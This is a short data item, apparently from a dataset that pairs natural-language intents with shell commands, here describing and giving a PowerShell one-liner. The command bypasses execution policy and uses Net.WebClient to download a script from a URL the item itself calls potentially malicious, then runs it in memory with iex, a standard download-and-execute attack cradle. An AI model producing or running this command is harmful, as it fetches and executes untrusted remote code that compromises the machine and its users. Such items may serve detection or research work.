# Natural language intent:
# Downloads and executes a PowerShell script from a potentially malicious URL with specific settings.

powershell.exe -exec bypass -nop -c "iex (New-Object Net.WebClient).DownloadString('http://threatSys.it/badKern32.ps1')"
